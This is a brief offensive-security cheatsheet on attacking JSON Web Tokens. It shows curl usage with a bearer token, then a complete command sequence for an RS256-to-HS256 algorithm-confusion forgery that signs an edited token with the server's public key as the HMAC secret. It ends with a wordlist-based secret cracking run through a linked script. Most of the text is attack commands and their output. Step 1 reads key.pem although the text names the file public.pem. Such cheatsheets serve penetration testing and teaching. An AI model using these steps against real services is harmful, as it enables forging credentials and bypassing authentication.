# JSON Web Token cheatsheet

## Pass the JWT with curl

```shell
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg" https://hostname/api
```

## Change the algorithm from RS256 to HS256

We assume the file public.pem contains the public key, then perform the following commands to sign data :

1. Convert the public key (public.pem) into HEX with this command
```shell
$ cat key.pem | xxd -p | tr -d "\\n"
2d2d2d2d2d424547494e...
```
2. Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited
```shell
$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e...
(stdin)= d2db96ad118c88c5d109b6be78af7b02973635c1a0fe527184314a27fdce65f5
```
3. Convert signature (Hex to "base64 URL")
```shell
$ python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('d2db96ad118c88c5d109b6be78af7b02973635c1a0fe527184314a27fdce65f5')).replace('=','')\")"
0tuWrRGMiMXRCba-eK97Apc2NcGg_lJxhDFKJ_3OZfU
```
4. Add signature to edited payload
```shell
JWT = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.0tuWrRGMiMXRCba-eK97Apc2NcGg_lJxhDFKJ_3OZfU
```

## Crack JWT key

https://github.com/Skadiia/Scripts/blob/master/JWTCracker/JWTCracker.py

Installation with pip :
```shell
# Require PyJWT
$ python JWTCracker.py -t "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg" -d "/usr/share/wordlists/rockyou.txt"
[+] Secret found : secret
```
